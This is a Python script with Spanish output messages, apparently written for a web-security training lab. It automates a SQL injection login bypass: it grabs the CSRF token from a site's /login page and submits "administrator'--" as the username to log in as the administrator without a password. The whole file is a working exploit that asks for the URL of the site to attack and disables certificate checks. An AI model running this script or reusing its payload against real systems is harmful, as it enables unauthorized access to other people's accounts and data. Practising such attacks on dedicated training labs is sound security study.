import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PARSER = 'html.parser'

def get_csrf_token(s, url):
    print("\nIngresando a la ruta '/login'")
    r = s.get(url+"login", verify=False)
    soup = BeautifulSoup(r.text, PARSER)
    csrf = soup.find("input")['value']
    print(f"\nSe ha encontrado el siguiente CSRF-Token: {csrf}" )
    return csrf

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    password = "randomtext"
    print(f"\nInyectando SQL payload: \"{payload}\" en el campo username")
    print(f"Utilizando el password: \"{password}\" en el campo password ")
    data = {"csrf": csrf,
            "username": payload,
            "password": password}
    r = s.post(url+"login", data=data)
    res = r.text
    
    if "Your username is: administrator" in res:
        print("\nSe ha encontrado el siguiente fragmento de codigo HTML:\n")
        print(BeautifulSoup(res, PARSER).find_all('p')[len(BeautifulSoup(res, PARSER).find_all('p'))-1])
        print("\nLa inyeccion se ha realizado con exito")
    else:
        print("Ha fallado la inyección SQL.")
    
def main():
    
    print("\nIngrese la URL base del sitio a atacar: ", end="")
    url = input()
    s = requests.Session()
    sqli_payload = "administrator'--"
    exploit_sqli(s, url, sqli_payload)
    
if __name__ == "__main__":
    main()